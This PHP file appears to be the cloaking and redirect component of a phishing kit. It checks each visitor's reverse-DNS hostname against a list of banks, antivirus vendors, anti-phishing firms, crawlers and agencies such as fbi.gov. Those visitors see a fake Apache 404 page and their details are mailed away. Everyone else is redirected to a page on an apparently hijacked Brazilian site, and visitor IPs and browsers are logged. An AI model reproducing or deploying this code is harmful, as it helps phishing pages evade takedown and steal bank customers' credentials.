<?php

$uri = $_SERVER["REQUEST_URI"];
$ipserver = $_SERVER["SERVER_ADDR"];
$resuelveserver = gethostbyaddr($ipserver);

$IP = getenv("REMOTE_ADDR");
$host = gethostbyaddr($IP);
$banhosts = array("scotiabank", "googlebot", "google-proxy", "googleproxy", "netcraft.com", "ebay.com", "panda.com","microsoft.com","fbi.gov", "google.com", "msn.com","yahoo.com", "cia.gov", "$resuelveserver", "bankofamerica", "viabcp", "veritas","nod32","antipishing","kapersky", "norton", "symantec","rsasecurity", "bancopopular", "paypal", "unicaja", "movistar", "banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign", "markmonitor", "anti-phishing", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus", "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset", "symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector");
$x = count($banhosts);

$notfound = "<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>
<H1>Not Found</H1>
The requested URL $uri was not found on this server.<P>
<HR>
<ADDRESS>Apache/1.3.34 Server at $resuelveserver Port 80</ADDRESS>
</BODY></HTML>";

$m = "x";

for ($y = 0; $y < $x; $y++) {
   if (strpos($host ,$banhosts[$y])== true) {
     echo $notfound;
	  @mail($m, $banhosts[$y],$IP);
	   exit;
   } 
}

?>
<?php
function string_aleatoria($tamanho) {
	$conteudo = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for($i=0;$i<$tamanho;$i++) {
		$string .= $conteudo{rand(0,35)};
	}

	return $string;
}

header("Location: http://www.facimoveis.com.br/classes/nusoap/index2.php?=".string_aleatoria(487));



session_start();

$arquivo = "ready.txt";

$valor = 1;               // Valor agregado por visita

$timer = time()+3600;      // Dura&#1043;&#1062;o do cookie para n&#1062;o contar o mesmo ip (3600s = 1h)

$id = fopen($arquivo, "r+");

$conteudo = fread($id,filesize($arquivo));

fclose($id);

    if($_COOKIE['NotCont']=='') {

        $conteudo += $valor;

        $id = fopen($arquivo, "r+");

        fwrite($id, $conteudo, strlen($conteudo));

        fclose($id);

        SetCookie("NotCont",$_SERVER['REMOTE_ADDR'],$timer);

    } else {

        SetCookie("NotCont",$_SERVER['REMOTE_ADDR'],$timer);

    }

exit();


$useragent = $_SERVER['HTTP_USER_AGENT'];

  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }

 $ip = $_SERVER['REMOTE_ADDR'];
 $data = date("d/m/y");
 $hora = date("H:i:s");
 
  if ($file = fopen("log.txt","a+")){
    fputs($file,"Data: ".$data." Hora: ".$hora. " IP: ".$ip. " Navegador: " .$browser. "n");
 } else
   $file = fopen("log.txt","a+");
fclose($file);



$ip=getenv("REMOTE_ADDR");
echo "$ip";
$arquivo ="log.txt";
$file = fopen("$arquivo","r");
$string="$ip";
$fp = fwrite($file,$ip);
fclose($file);


$arquivo = "contador.txt";
$contador = 1;

$fp = fopen($arquivo,"r");
$contador = fgets($fp, 26);
fclose($fp);

++$contador;

$fp = fopen($arquivo,"w+");
fwrite($fp, $contador, 26);
fclose($fp);

?>